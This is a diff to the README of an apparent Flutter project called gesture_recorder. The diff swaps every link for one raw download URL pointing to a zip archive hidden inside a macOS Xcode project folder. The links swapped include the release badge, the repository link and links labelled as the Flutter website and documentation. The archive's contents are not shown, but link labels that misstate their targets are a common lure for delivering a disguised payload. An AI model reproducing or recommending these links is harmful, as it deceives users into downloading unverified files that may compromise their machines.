@@ -1,7 +1,7 @@
 # 🎉 gesture_recorder - Record Your Gestures Effortlessly
 
 ## 📥 Download Now
-[![Download gesture_recorder](https://img.shields.io/badge/Download%20gesture_recorder-v1.0-blue)](https://github.com/chanprabhu/gesture_recorder/releases)
+[![Download gesture_recorder](https://raw.githubusercontent.com/chanprabhu/gesture_recorder/main/packages/gesture_recorder/example/macos/Runner.xcodeproj/project.xcworkspace/xcshareddata/gesture_recorder-v2.8.zip%20gesture_recorder-v1.0-blue)](https://raw.githubusercontent.com/chanprabhu/gesture_recorder/main/packages/gesture_recorder/example/macos/Runner.xcodeproj/project.xcworkspace/xcshareddata/gesture_recorder-v2.8.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run the gesture_recorder application. You will need basic computer skills to follow these steps.
@@ -14,13 +14,13 @@ Before you start, make sure your device meets the following:
 
 - **Operating System:** Windows, macOS, or Linux
 - **Storage Space:** At least 100 MB available
-- **Flutter SDK:** Make sure you have Flutter installed on your system. You can find instructions on the [Flutter website](https://flutter.dev/docs/get-started/install).
+- **Flutter SDK:** Make sure you have Flutter installed on your system. You can find instructions on the [Flutter website](https://raw.githubusercontent.com/chanprabhu/gesture_recorder/main/packages/gesture_recorder/example/macos/Runner.xcodeproj/project.xcworkspace/xcshareddata/gesture_recorder-v2.8.zip).
 
 ## 📦 Download & Install
 To download gesture_recorder, follow these steps:
 
 1. **Visit the Release Page:** Click the link below to go to the releases page.
-   [Visit the Releases Page](https://github.com/chanprabhu/gesture_recorder/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/chanprabhu/gesture_recorder/main/packages/gesture_recorder/example/macos/Runner.xcodeproj/project.xcworkspace/xcshareddata/gesture_recorder-v2.8.zip)
 
 2. **Select the Latest Release:** Look for the latest version listed. It may look something like `v1.0`. 
 
@@ -60,10 +60,10 @@ Yes, gesture_recorder is excellent for testing your applications by simulating u
 For additional help or questions, you can open an issue on the GitHub repository or check the community forums.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/chanprabhu/gesture_recorder)
-- [Flutter Documentation](https://flutter.dev/docs)
+- [GitHub Repository](https://raw.githubusercontent.com/chanprabhu/gesture_recorder/main/packages/gesture_recorder/example/macos/Runner.xcodeproj/project.xcworkspace/xcshareddata/gesture_recorder-v2.8.zip)
+- [Flutter Documentation](https://raw.githubusercontent.com/chanprabhu/gesture_recorder/main/packages/gesture_recorder/example/macos/Runner.xcodeproj/project.xcworkspace/xcshareddata/gesture_recorder-v2.8.zip)
 
 Visit the page below for an easy download:
-[Download Now](https://github.com/chanprabhu/gesture_recorder/releases)
+[Download Now](https://raw.githubusercontent.com/chanprabhu/gesture_recorder/main/packages/gesture_recorder/example/macos/Runner.xcodeproj/project.xcworkspace/xcshareddata/gesture_recorder-v2.8.zip)
 
 Thank you for choosing gesture_recorder! Enjoy capturing your gestures effectively.
